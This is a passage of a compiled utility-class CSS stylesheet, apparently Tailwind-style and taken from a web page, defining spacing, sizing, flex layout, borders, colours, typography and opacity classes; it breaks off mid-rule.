      .ml-md {
        margin-left: var(--spacing-md);
      }

      .ml-sm {
        margin-left: var(--spacing-sm);
      }

      .ml-xl {
        margin-left: var(--spacing-xl);
      }

      .mr-\[-1px\] {
        margin-right: -1px;
      }

      .mr-auto {
        margin-right: var(--spacing-auto);
      }

      .mr-lg {
        margin-right: var(--spacing-lg);
      }

      .mr-md {
        margin-right: var(--spacing-md);
      }

      .mt-2xl {
        margin-top: var(--spacing-2xl);
      }

      .mt-3xl {
        margin-top: var(--spacing-3xl);
      }

      .mt-lg {
        margin-top: var(--spacing-lg);
      }

      .mt-md {
        margin-top: var(--spacing-md);
      }

      .mt-sm {
        margin-top: var(--spacing-sm);
      }

      .mt-xl {
        margin-top: var(--spacing-xl);
      }

      .box-border {
        -webkit-box-sizing: border-box;
        box-sizing: border-box;
      }

      .block {
        display: block;
      }

      .inline-block {
        display: inline-block;
      }

      .inline {
        display: inline;
      }

      .flex {
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
      }

      .inline-flex {
        display: -webkit-inline-flex;
        display: -ms-inline-flexbox;
        display: inline-flex;
      }

      .table {
        display: table;
      }

      .grid {
        display: grid;
      }

      .hidden {
        display: none;
      }

      .h-3\/5 {
        height: 60%;
      }

      .h-\[100vh\] {
        height: 100vh;
      }

      .h-\[70px\] {
        height: 70px;
      }

      .h-\[75px\] {
        height: 75px;
      }

      .h-\[calc\(100\%-50px\)\] {
        height: calc(100% - 50px);
      }

      .h-auto {
        height: var(--spacing-auto);
      }

      .h-full {
        height: 100%;
      }

      .h-none {
        height: var(--spacing-none);
      }

      .h-screen {
        height: 100vh;
      }

      .h-sz-16 {
        height: var(--sz-16);
      }

      .h-sz-20 {
        height: var(--sz-20);
      }

      .h-sz-24 {
        height: var(--sz-24);
      }

      .h-sz-28 {
        height: var(--sz-28);
      }

      .h-sz-32 {
        height: var(--sz-32);
      }

      .h-sz-4 {
        height: var(--sz-4);
      }

      .h-sz-40 {
        height: var(--sz-40);
      }

      .h-sz-400 {
        height: var(--sz-400);
      }

      .h-sz-44 {
        height: var(--sz-44);
      }

      .h-sz-56 {
        height: var(--sz-56);
      }

      .h-xl {
        height: var(--spacing-xl);
      }

      .max-h-\[80\%\] {
        max-height: 80%;
      }

      .max-h-\[calc\(100vh_-_theme\(\"spacing\.3xl\"\)\)\] {
        max-height: calc(100vh - var(--spacing-3xl));
      }

      .min-h-\[5rem\] {
        min-height: 5rem;
      }

      .min-h-sz-44 {
        min-height: var(--sz-44);
      }

      .\!w-full {
        width: 100% !important;
      }

      .w-1\/2 {
        width: 50%;
      }

      .w-11\/12 {
        width: 91.666667%;
      }

      .w-3\/5 {
        width: 60%;
      }

      .w-\[--radix-popper-anchor-width\] {
        width: var(--radix-popper-anchor-width);
      }

      .w-\[13rem\] {
        width: 13rem;
      }

      .w-\[75px\] {
        width: 75px;
      }

      .w-auto {
        width: var(--spacing-auto);
      }

      .w-fit {
        width: -webkit-fit-content;
        width: -moz-fit-content;
        width: fit-content;
      }

      .w-full {
        width: 100%;
      }

      .w-lg {
        width: var(--spacing-lg);
      }

      .w-screen {
        width: 100vw;
      }

      .w-sz-16 {
        width: var(--sz-16);
      }

      .w-sz-20 {
        width: var(--sz-20);
      }

      .w-sz-24 {
        width: var(--sz-24);
      }

      .w-sz-28 {
        width: var(--sz-28);
      }

      .w-sz-32 {
        width: var(--sz-32);
      }

      .w-sz-40 {
        width: var(--sz-40);
      }

      .w-sz-400 {
        width: var(--sz-400);
      }

      .min-w-sz-32 {
        min-width: var(--sz-32);
      }

      .min-w-sz-40 {
        min-width: var(--sz-40);
      }

      .min-w-sz-44 {
        min-width: var(--sz-44);
      }

      .min-w-sz-56 {
        min-width: var(--sz-56);
      }

      .max-w-0 {
        max-width: 0;
      }

      .max-w-7xl {
        max-width: 80rem;
      }

      .max-w-\[--radix-popper-available-width\] {
        max-width: var(--radix-popper-available-width);
      }

      .max-w-\[498px\] {
        max-width: 498px;
      }

      .max-w-full {
        max-width: 100%;
      }

      .max-w-screen-lg {
        max-width: 1024px;
      }

      .max-w-sz-384 {
        max-width: var(--sz-384);
      }

      .max-w-sz-480 {
        max-width: var(--sz-480);
      }

      .max-w-sz-672 {
        max-width: var(--sz-672);
      }

      .max-w-sz-864 {
        max-width: var(--sz-864);
      }

      .flex-1 {
        -webkit-flex: 1 1;
        -ms-flex: 1 1;
        flex: 1 1;
      }

      .shrink-0 {
        -ms-flex-negative: 0;
        -webkit-flex-shrink: 0;
        flex-shrink: 0;
      }

      .flex-grow-0 {
        -webkit-flex-grow: 0;
        -ms-flex-positive: 0;
        flex-grow: 0;
      }

      .flex-grow-\[1\],
      .grow {
        -webkit-flex-grow: 1;
        -ms-flex-positive: 1;
        flex-grow: 1;
      }

      .grow-0 {
        -webkit-flex-grow: 0;
        -ms-flex-positive: 0;
        flex-grow: 0;
      }

      .-translate-x-1\/2 {
        --tw-translate-x: -50%;
      }

      .-translate-x-1\/2,
      .-translate-y-1\/2 {
        -webkit-transform: translate(
            var(--tw-translate-x),
            var(--tw-translate-y)
          )
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
        -ms-transform: translate(var(--tw-translate-x), var(--tw-translate-y))
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
        transform: translate(var(--tw-translate-x), var(--tw-translate-y))
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
      }

      .-translate-y-1\/2 {
        --tw-translate-y: -50%;
      }

      .translate-y-full {
        --tw-translate-y: 100%;
      }

      .translate-y-full,
      .translate-y-none {
        -webkit-transform: translate(
            var(--tw-translate-x),
            var(--tw-translate-y)
          )
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
        -ms-transform: translate(var(--tw-translate-x), var(--tw-translate-y))
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
        transform: translate(var(--tw-translate-x), var(--tw-translate-y))
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
      }

      .translate-y-none {
        --tw-translate-y: var(--spacing-none);
      }

      .rotate-0 {
        --tw-rotate: 0deg;
      }

      .rotate-0,
      .transform {
        -webkit-transform: translate(
            var(--tw-translate-x),
            var(--tw-translate-y)
          )
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
        -ms-transform: translate(var(--tw-translate-x), var(--tw-translate-y))
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
        transform: translate(var(--tw-translate-x), var(--tw-translate-y))
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
      }

      .transform-gpu {
        -webkit-transform: translate3d(
            var(--tw-translate-x),
            var(--tw-translate-y),
            0
          )
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
        transform: translate3d(var(--tw-translate-x), var(--tw-translate-y), 0)
          rotate(var(--tw-rotate)) skewX(var(--tw-skew-x))
          skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x))
          scaleY(var(--tw-scale-y));
      }

      @-webkit-keyframes pulse {
        50% {
          opacity: 0.5;
        }
      }

      @keyframes pulse {
        50% {
          opacity: 0.5;
        }
      }

      .animate-pulse {
        -webkit-animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
      }

      @-webkit-keyframes spin {
        to {
          -webkit-transform: rotate(1turn);
          transform: rotate(1turn);
        }
      }

      @keyframes spin {
        to {
          -webkit-transform: rotate(1turn);
          transform: rotate(1turn);
        }
      }

      .animate-spin {
        -webkit-animation: spin 1s linear infinite;
        animation: spin 1s linear infinite;
      }

      .cursor-auto {
        cursor: auto;
      }

      .cursor-not-allowed {
        cursor: not-allowed;
      }

      .cursor-pointer {
        cursor: pointer;
      }

      .list-inside {
        list-style-position: inside;
      }

      .list-disc {
        list-style-type: disc;
      }

      .appearance-none {
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
      }

      .grid-cols-4 {
        grid-template-columns: repeat(4, minmax(0, 1fr));
      }

      .grid-cols-page {
        grid-template-columns: 100%;
      }

      .grid-rows-small-page {
        grid-template-rows: 5rem 1fr -webkit-min-content;
        grid-template-rows: 5rem 1fr min-content;
      }

      .flex-row {
        -webkit-flex-direction: row;
        -ms-flex-direction: row;
        flex-direction: row;
      }

      .flex-col {
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
      }

      .flex-wrap {
        -webkit-flex-wrap: wrap;
        -ms-flex-wrap: wrap;
        flex-wrap: wrap;
      }

      .items-start {
        -webkit-align-items: flex-start;
        -ms-flex-align: start;
        align-items: flex-start;
      }

      .items-center {
        -webkit-align-items: center;
        -ms-flex-align: center;
        align-items: center;
      }

      .items-stretch {
        -webkit-align-items: stretch;
        -ms-flex-align: stretch;
        align-items: stretch;
      }

      .justify-start {
        -webkit-justify-content: flex-start;
        -ms-flex-pack: start;
        justify-content: flex-start;
      }

      .justify-center {
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
      }

      .justify-between {
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
      }

      .justify-evenly {
        -webkit-justify-content: space-evenly;
        -ms-flex-pack: space-evenly;
        justify-content: space-evenly;
      }

      .\!gap-sm {
        gap: var(--spacing-sm) !important;
      }

      .gap-2xl {
        gap: var(--spacing-2xl);
      }

      .gap-3xl {
        gap: var(--spacing-3xl);
      }

      .gap-lg {
        gap: var(--spacing-lg);
      }

      .gap-md {
        gap: var(--spacing-md);
      }

      .gap-sm {
        gap: var(--spacing-sm);
      }

      .gap-xl {
        gap: var(--spacing-xl);
      }

      .gap-y-none {
        row-gap: var(--spacing-none);
      }

      .self-start {
        -webkit-align-self: flex-start;
        -ms-flex-item-align: start;
        align-self: flex-start;
      }

      .self-center {
        -webkit-align-self: center;
        -ms-flex-item-align: center;
        align-self: center;
      }

      .self-stretch {
        -webkit-align-self: stretch;
        -ms-flex-item-align: stretch;
        align-self: stretch;
      }

      .self-baseline {
        -webkit-align-self: baseline;
        -ms-flex-item-align: baseline;
        align-self: baseline;
      }

      .overflow-hidden {
        overflow: hidden;
      }

      .overflow-y-auto {
        overflow-y: auto;
      }

      .overflow-x-hidden {
        overflow-x: hidden;
      }

      .text-ellipsis {
        -o-text-overflow: ellipsis;
        text-overflow: ellipsis;
      }

      .whitespace-nowrap {
        white-space: nowrap;
      }

      .rounded-full {
        border-radius: var(--border-radius-full);
      }

      .rounded-lg {
        border-radius: var(--border-radius-lg);
      }

      .rounded-md {
        border-radius: var(--border-radius-md);
      }

      .rounded-none {
        border-radius: var(--border-radius-none);
      }

      .rounded-sm {
        border-radius: var(--border-radius-sm);
      }

      .rounded-xl {
        border-radius: var(--border-radius-xl);
      }

      .\!rounded-l-none {
        border-top-left-radius: var(--border-radius-none) !important;
        border-bottom-left-radius: var(--border-radius-none) !important;
      }

      .\!rounded-r-none {
        border-top-right-radius: var(--border-radius-none) !important;
        border-bottom-right-radius: var(--border-radius-none) !important;
      }

      .rounded-l-lg {
        border-top-left-radius: var(--border-radius-lg);
        border-bottom-left-radius: var(--border-radius-lg);
      }

      .rounded-l-none {
        border-top-left-radius: var(--border-radius-none);
        border-bottom-left-radius: var(--border-radius-none);
      }

      .rounded-r-lg {
        border-top-right-radius: var(--border-radius-lg);
        border-bottom-right-radius: var(--border-radius-lg);
      }

      .rounded-r-none {
        border-top-right-radius: var(--border-radius-none);
        border-bottom-right-radius: var(--border-radius-none);
      }

      .rounded-tl-md {
        border-top-left-radius: var(--border-radius-md);
      }

      .rounded-tr-md {
        border-top-right-radius: var(--border-radius-md);
      }

      .border-md {
        border-width: var(--border-width-md);
      }

      .border-none {
        border-width: var(--border-width-none);
      }

      .border-sm {
        border-width: var(--border-width-sm);
      }

      .border-l-none {
        border-left-width: var(--border-width-none);
      }

      .border-r-none {
        border-right-width: var(--border-width-none);
      }

      .border-t-sm {
        border-top-width: var(--border-width-sm);
      }

      .border-solid {
        border-style: solid;
      }

      .border-dashed {
        border-style: dashed;
      }

      .border-none {
        border-style: none;
      }

      .border-accent {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-accent) / var(--tw-border-opacity));
      }

      .border-alert {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-alert) / var(--tw-border-opacity));
      }

      .border-basic {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-basic) / var(--tw-border-opacity));
      }

      .border-current {
        border-color: currentColor;
      }

      .border-error {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-error) / var(--tw-border-opacity));
      }

      .border-info {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-info) / var(--tw-border-opacity));
      }

      .border-main {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-main) / var(--tw-border-opacity));
      }

      .border-neutral {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-neutral) / var(--tw-border-opacity));
      }

      .border-neutral\/dim-4 {
        border-color: rgb(var(--colors-neutral) / var(--opacity-dim-4));
      }

      .border-outline {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-outline) / var(--tw-border-opacity));
      }

      .border-outline-high {
        --tw-border-opacity: 1;
        border-color: rgb(
          var(--colors-outline-high) / var(--tw-border-opacity)
        );
      }

      .border-success {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-success) / var(--tw-border-opacity));
      }

      .border-support {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-support) / var(--tw-border-opacity));
      }

      .border-b-neutral-container {
        --tw-border-opacity: 1;
        border-bottom-color: rgb(
          var(--colors-neutral-container) / var(--tw-border-opacity)
        );
      }

      .border-b-transparent {
        border-bottom-color: #0000;
      }

      .border-l-neutral-container {
        --tw-border-opacity: 1;
        border-left-color: rgb(
          var(--colors-neutral-container) / var(--tw-border-opacity)
        );
      }

      .border-l-transparent {
        border-left-color: #0000;
      }

      .border-t-neutral {
        --tw-border-opacity: 1;
        border-top-color: rgb(var(--colors-neutral) / var(--tw-border-opacity));
      }

      .\!bg-background {
        --tw-bg-opacity: 1 !important;
        background-color: rgb(
          var(--colors-background) / var(--tw-bg-opacity)
        ) !important;
      }

      .bg-\[\#e6ebef\] {
        --tw-bg-opacity: 1;
        background-color: rgb(230 235 239 / var(--tw-bg-opacity));
      }

      .bg-accent {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-accent) / var(--tw-bg-opacity));
      }

      .bg-accent-container {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-accent-container) / var(--tw-bg-opacity)
        );
      }

      .bg-alert {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-alert) / var(--tw-bg-opacity));
      }

      .bg-alert-container {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-alert-container) / var(--tw-bg-opacity)
        );
      }

      .bg-background {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-background) / var(--tw-bg-opacity));
      }

      .bg-background-variant {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-background-variant) / var(--tw-bg-opacity)
        );
      }

      .bg-basic {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-basic) / var(--tw-bg-opacity));
      }

      .bg-basic-container {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-basic-container) / var(--tw-bg-opacity)
        );
      }

      .bg-error {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-error) / var(--tw-bg-opacity));
      }

      .bg-error-container {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-error-container) / var(--tw-bg-opacity)
        );
      }

      .bg-info {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-info) / var(--tw-bg-opacity));
      }

      .bg-info-container {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-info-container) / var(--tw-bg-opacity)
        );
      }

      .bg-main {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-main) / var(--tw-bg-opacity));
      }

      .bg-main-container {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-main-container) / var(--tw-bg-opacity)
        );
      }

      .bg-neutral {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-neutral) / var(--tw-bg-opacity));
      }

      .bg-neutral-container {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-neutral-container) / var(--tw-bg-opacity)
        );
      }

      .bg-on-background {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-on-background) / var(--tw-bg-opacity)
        );
      }

      .bg-on-background\/dim-4 {
        background-color: rgb(
          var(--colors-on-background) / var(--opacity-dim-4)
        );
      }

      .bg-on-surface\/dim-5 {
        background-color: rgb(var(--colors-on-surface) / var(--opacity-dim-5));
      }

      .bg-overlay {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-overlay) / var(--tw-bg-opacity));
      }

      .bg-overlay\/dim-3 {
        background-color: rgb(var(--colors-overlay) / var(--opacity-dim-3));
      }

      .bg-success {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-success) / var(--tw-bg-opacity));
      }

      .bg-success-container {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-success-container) / var(--tw-bg-opacity)
        );
      }

      .bg-support {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-support) / var(--tw-bg-opacity));
      }

      .bg-support-container {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-support-container) / var(--tw-bg-opacity)
        );
      }

      .bg-surface {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-surface) / var(--tw-bg-opacity));
      }

      .bg-transparent {
        background-color: transparent;
        background-color: initial;
      }

      .bg-opacity-dim-5 {
        --tw-bg-opacity: var(--opacity-dim-5);
      }

      .fill-current {
        fill: currentColor;
      }

      .fill-error {
        fill: rgb(var(--colors-error) / 1);
      }

      .fill-main {
        fill: rgb(var(--colors-main) / 1);
      }

      .fill-neutral {
        fill: rgb(var(--colors-neutral) / 1);
      }

      .fill-neutral-pressed {
        fill: rgb(var(--colors-neutral-pressed) / 1);
      }

      .fill-on-success-container {
        fill: rgb(var(--colors-on-success-container) / 1);
      }

      .fill-success {
        fill: rgb(var(--colors-success) / 1);
      }

      .fill-surface {
        fill: rgb(var(--colors-surface) / 1);
      }

      .p-2xl {
        padding: var(--spacing-2xl);
      }

      .p-3xl {
        padding: var(--spacing-3xl);
      }

      .p-lg {
        padding: var(--spacing-lg);
      }

      .p-md {
        padding: var(--spacing-md);
      }

      .p-xl {
        padding: var(--spacing-xl);
      }

      .px-\[var\(--sz-12\)\] {
        padding-left: var(--sz-12);
        padding-right: var(--sz-12);
      }

      .px-lg {
        padding-left: var(--spacing-lg);
        padding-right: var(--spacing-lg);
      }

      .px-md {
        padding-left: var(--spacing-md);
        padding-right: var(--spacing-md);
      }

      .px-none {
        padding-left: var(--spacing-none);
        padding-right: var(--spacing-none);
      }

      .px-sm {
        padding-left: var(--spacing-sm);
        padding-right: var(--spacing-sm);
      }

      .px-xl {
        padding-left: var(--spacing-xl);
        padding-right: var(--spacing-xl);
      }

      .py-2xl {
        padding-top: var(--spacing-2xl);
        padding-bottom: var(--spacing-2xl);
      }

      .py-3xl {
        padding-top: var(--spacing-3xl);
        padding-bottom: var(--spacing-3xl);
      }

      .py-lg {
        padding-top: var(--spacing-lg);
        padding-bottom: var(--spacing-lg);
      }

      .py-none {
        padding-top: var(--spacing-none);
        padding-bottom: var(--spacing-none);
      }

      .py-xl {
        padding-top: var(--spacing-xl);
        padding-bottom: var(--spacing-xl);
      }

      .pb-lg {
        padding-bottom: var(--spacing-lg);
      }

      .pb-md {
        padding-bottom: var(--spacing-md);
      }

      .pb-sm {
        padding-bottom: var(--spacing-sm);
      }

      .pl-3xl {
        padding-left: var(--spacing-3xl);
      }

      .pl-lg {
        padding-left: var(--spacing-lg);
      }

      .pl-md {
        padding-left: var(--spacing-md);
      }

      .pr-3xl {
        padding-right: var(--spacing-3xl);
      }

      .pr-\[40px\] {
        padding-right: 40px;
      }

      .pr-\[calc\(theme\(\'spacing\.3xl\'\)\*2\)\] {
        padding-right: calc(var(--spacing-3xl) * 2);
      }

      .pr-lg {
        padding-right: var(--spacing-lg);
      }

      .pr-md {
        padding-right: var(--spacing-md);
      }

      .pt-2xl {
        padding-top: var(--spacing-2xl);
      }

      .pt-3xl {
        padding-top: var(--spacing-3xl);
      }

      .pt-lg {
        padding-top: var(--spacing-lg);
      }

      .pt-md {
        padding-top: var(--spacing-md);
      }

      .pt-none {
        padding-top: var(--spacing-none);
      }

      .pt-xl {
        padding-top: var(--spacing-xl);
      }

      .text-left {
        text-align: left;
      }

      .text-center {
        text-align: center;
      }

      .text-\[62\.5\%\] {
        font-size: 62.5%;
      }

      .text-body-1 {
        font-size: var(--font-size-body-1-font-size);
        line-height: var(--font-size-body-1-line-height);
      }

      .text-body-1-link {
        font-size: var(--font-size-body-1-link-font-size);
        line-height: var(--font-size-body-1-link-line-height);
      }

      .text-body-2 {
        font-size: var(--font-size-body-2-font-size);
        line-height: var(--font-size-body-2-line-height);
      }

      .text-callout {
        font-size: var(--font-size-callout-font-size);
        line-height: var(--font-size-callout-line-height);
      }

      .text-caption {
        font-size: var(--font-size-caption-font-size);
        line-height: var(--font-size-caption-line-height);
      }

      .text-caption-link {
        font-size: var(--font-size-caption-link-font-size);
        line-height: var(--font-size-caption-link-line-height);
      }

      .text-display-1-expanded {
        font-size: var(--font-size-display-1-expanded-font-size);
        line-height: var(--font-size-display-1-expanded-line-height);
        font-weight: var(--font-size-display-1-expanded-font-weight);
      }

      .text-display-2 {
        font-size: var(--font-size-display-2-font-size);
        line-height: var(--font-size-display-2-line-height);
        font-weight: var(--font-size-display-2-font-weight);
      }

      .text-display-3 {
        font-size: var(--font-size-display-3-font-size);
        line-height: var(--font-size-display-3-line-height);
        font-weight: var(--font-size-display-3-font-weight);
      }

      .text-headline-1 {
        font-size: var(--font-size-headline-1-font-size);
        line-height: var(--font-size-headline-1-line-height);
        font-weight: var(--font-size-headline-1-font-weight);
      }

      .text-headline-1-expanded {
        font-size: var(--font-size-headline-1-expanded-font-size);
        line-height: var(--font-size-headline-1-expanded-line-height);
        font-weight: var(--font-size-headline-1-expanded-font-weight);
      }

      .text-headline-2 {
        font-size: var(--font-size-headline-2-font-size);
        line-height: var(--font-size-headline-2-line-height);
        font-weight: var(--font-size-headline-2-font-weight);
      }

      .text-small {
        font-size: var(--font-size-small-font-size);
        line-height: var(--font-size-small-line-height);
      }

      .text-subhead {
        font-size: var(--font-size-subhead-font-size);
        line-height: var(--font-size-subhead-line-height);
        font-weight: var(--font-size-subhead-font-weight);
      }

      .text-subhead-expanded {
        font-size: var(--font-size-subhead-expanded-font-size);
        line-height: var(--font-size-subhead-expanded-line-height);
        font-weight: var(--font-size-subhead-expanded-font-weight);
      }

      .font-bold {
        font-weight: var(--font-weight-bold);
      }

      .font-regular {
        font-weight: var(--font-weight-regular);
      }

      .font-semi-bold {
        font-weight: var(--font-weight-semi-bold);
      }

      .\!text-on-surface\/dim-1 {
        color: rgb(var(--colors-on-surface) / var(--opacity-dim-1)) !important;
      }

      .text-accent {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-accent) / var(--tw-text-opacity));
      }

      .text-accent-hovered {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-accent-hovered) / var(--tw-text-opacity));
      }

      .text-alert {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-alert) / var(--tw-text-opacity));
      }

      .text-alert-hovered {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-alert-hovered) / var(--tw-text-opacity));
      }

      .text-basic {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-basic) / var(--tw-text-opacity));
      }

      .text-basic-hovered {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-basic-hovered) / var(--tw-text-opacity));
      }

      .text-current {
        color: currentColor;
      }

      .text-error {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-error) / var(--tw-text-opacity));
      }

      .text-error-hovered {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-error-hovered) / var(--tw-text-opacity));
      }

      .text-info {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-info) / var(--tw-text-opacity));
      }

      .text-info-hovered {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-info-hovered) / var(--tw-text-opacity));
      }

      .text-main {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-main) / var(--tw-text-opacity));
      }

      .text-main-hovered {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-main-hovered) / var(--tw-text-opacity));
      }

      .text-neutral {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-neutral) / var(--tw-text-opacity));
      }

      .text-neutral-container {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-neutral-container) / var(--tw-text-opacity));
      }

      .text-neutral\/dim-2 {
        color: rgb(var(--colors-neutral) / var(--opacity-dim-2));
      }

      .text-on-accent {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-accent) / var(--tw-text-opacity));
      }

      .text-on-accent-container {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-accent-container) / var(--tw-text-opacity));
      }

      .text-on-alert {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-alert) / var(--tw-text-opacity));
      }

      .text-on-alert-container {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-alert-container) / var(--tw-text-opacity));
      }

      .text-on-background {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-background) / var(--tw-text-opacity));
      }

      .text-on-basic {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-basic) / var(--tw-text-opacity));
      }

      .text-on-basic-container {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-basic-container) / var(--tw-text-opacity));
      }

      .text-on-error {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-error) / var(--tw-text-opacity));
      }

      .text-on-error-container {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-error-container) / var(--tw-text-opacity));
      }

      .text-on-info {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-info) / var(--tw-text-opacity));
      }

      .text-on-info-container {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-info-container) / var(--tw-text-opacity));
      }

      .text-on-main {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-main) / var(--tw-text-opacity));
      }

      .text-on-main-container {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-main-container) / var(--tw-text-opacity));
      }

      .text-on-neutral {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-neutral) / var(--tw-text-opacity));
      }

      .text-on-neutral-container {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-neutral-container) / var(--tw-text-opacity));
      }

      .text-on-success {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-success) / var(--tw-text-opacity));
      }

      .text-on-success-container {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-success-container) / var(--tw-text-opacity));
      }

      .text-on-support {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-support) / var(--tw-text-opacity));
      }

      .text-on-support-container {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-support-container) / var(--tw-text-opacity));
      }

      .text-on-surface {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-on-surface) / var(--tw-text-opacity));
      }

      .text-on-surface\/dim-1 {
        color: rgb(var(--colors-on-surface) / var(--opacity-dim-1));
      }

      .text-on-surface\/dim-3 {
        color: rgb(var(--colors-on-surface) / var(--opacity-dim-3));
      }

      .text-outline {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-outline) / var(--tw-text-opacity));
      }

      .text-outline-high {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-outline-high) / var(--tw-text-opacity));
      }

      .text-success {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-success) / var(--tw-text-opacity));
      }

      .text-success-hovered {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-success-hovered) / var(--tw-text-opacity));
      }

      .text-support {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-support) / var(--tw-text-opacity));
      }

      .text-support-hovered {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-support-hovered) / var(--tw-text-opacity));
      }

      .text-surface {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-surface) / var(--tw-text-opacity));
      }

      .text-transparent {
        color: #0000;
      }

      .underline {
        -webkit-text-decoration-line: underline;
        text-decoration-line: underline;
      }

      .caret-neutral {
        caret-color: rgb(var(--colors-neutral) / 1);
      }

      .opacity-0 {
        opacity: var(--opacity-0);
      }

      .opacity-dim-1 {
        opacity: var(--opacity-dim-1);
      }

      .opacity-dim-2 {
        opacity: var(--opacity-dim-2);
      }

      .opacity-dim-3 {
